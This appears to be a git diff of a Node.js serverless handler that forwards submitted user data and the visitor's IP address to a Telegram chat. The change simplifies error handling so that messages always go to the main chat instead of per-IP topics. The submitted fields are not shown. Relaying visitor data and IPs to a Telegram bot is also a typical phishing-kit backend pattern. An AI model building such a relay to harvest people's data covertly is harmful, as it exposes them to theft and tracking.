@@ -39,8 +39,14 @@ async function findExistingTopicForIP(ipAddress) {
 
       if (!response.ok) {
         const errorData = await response.json().catch(() => ({}));
-        // Hvis API ikke støtter getForumTopics eller feiler, returner null
-        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
+        const errorMsg = errorData.description || response.statusText || '';
+        // Hvis chat not found eller topics ikke støttes, returner null
+        if (errorMsg.includes('chat not found') || errorMsg.includes('Chat not found') || 
+            errorMsg.includes('not found')) {
+          console.log(`getForumTopics: Chat not found or topics not supported`);
+          return null;
+        }
+        console.log(`getForumTopics feilet: ${errorMsg}`);
         return null;
       }
 
@@ -134,7 +140,14 @@ async function createTopicForIP(ipAddress) {
   });
 
   if (!response.ok) {
-    const errorData = await response.json();
+    const errorData = await response.json().catch(() => ({}));
+    const errorMsg = errorData.description || response.statusText || '';
+    
+    // Hvis chat not found, ikke prøv topics
+    if (errorMsg.includes('chat not found') || errorMsg.includes('Chat not found')) {
+      console.log(`createTopicForIP: Chat not found, topics ikke tilgjengelig`);
+      return null;
+    }
     
     // Hvis topic allerede eksisterer (selv om vi ikke fant det), prøv å finne det igjen
     if (errorData.description && errorData.description.includes('already exists')) {
@@ -146,10 +159,11 @@ async function createTopicForIP(ipAddress) {
     }
     
     // Hvis topics ikke er støttet, returner null
-    if (errorData.error_code === 400) {
-      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
+    if (errorData.error_code === 400 || errorMsg.includes('not supported') || errorMsg.includes('not a supergroup')) {
+      console.log(`Topics ikke støttet for denne chatten`);
+      return null;
     }
-    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
+    throw new Error(`Kunne ikke opprette topic: ${errorMsg}`);
   }
 
   const result = await response.json();
@@ -390,28 +404,16 @@ module.exports = async (req, res) => {
       ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
       : req.headers['x-real-ip'] || req.connection?.remoteAddress || 'Ukjent IP';
 
-    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
-    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
-    
-    // Hent eller opprett topic for denne IP-adressen
-    // Hvis topics ikke fungerer, returnerer getOrCreateTopicForIP null
-    let topicId = null;
-    try {
-      topicId = await getOrCreateTopicForIP(ip_adresse);
-    } catch (topicError) {
-      console.log('Topics ikke tilgjengelig, sender til hovedkanal:', topicError.message);
-      topicId = null;
-    }
-
-    // Formater meldingen (inkluderer spesiell header hvis ny IP)
+    // Formater meldingen
     const message = formatTelegramMessage({
       ...userData,
       ip_adresse,
-    }, isNewIPAddress);
+    }, false);
 
-    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
+    // Prøv å sende direkte til hovedkanalen først (uten topics)
+    // Dette sikrer at vi kan sende selv om topics ikke fungerer
     try {
-      await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
+      await sendToTelegram(TELEGRAM_CHAT_ID, message, null);
       console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
       
       res.status(200).json({ 
@@ -420,23 +422,8 @@ module.exports = async (req, res) => {
       });
     } catch (telegramError) {
       console.error('Telegram send error:', telegramError);
-      // If it's a chat not found error, try sending without topic
-      if (telegramError.message && telegramError.message.includes('chat not found') && topicId !== null) {
-        console.log('Retrying without topic...');
-        try {
-          await sendToTelegram(TELEGRAM_CHAT_ID, message, null);
-          console.log(`Data sendt til Telegram (uten topic) for IP: ${ip_adresse}`);
-          res.status(200).json({ 
-            message: 'Data sendt til Telegram!',
-            ip_adresse: ip_adresse,
-            note: 'Sent without topic (chat might not support topics)'
-          });
-        } catch (retryError) {
-          throw retryError;
-        }
-      } else {
-        throw telegramError;
-      }
+      // Hvis det fortsatt feiler, kast feilen
+      throw telegramError;
     }
   } catch (error) {
     console.error('Telegram error:', error);
